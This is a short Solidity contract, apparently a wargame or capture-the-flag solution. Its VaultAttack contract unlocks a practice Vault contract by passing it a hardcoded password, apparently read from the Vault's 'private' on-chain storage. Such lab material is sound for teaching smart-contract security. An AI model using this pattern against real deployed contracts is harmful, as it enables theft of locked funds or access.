//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Vault.sol";

import "hardhat/console.sol";

contract VaultAttack {

    Vault public victimContract;

    constructor (address _victimContractAddr) {
        victimContract = Vault(_victimContractAddr);
    }

    function attack () public payable {
        victimContract.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
    }

}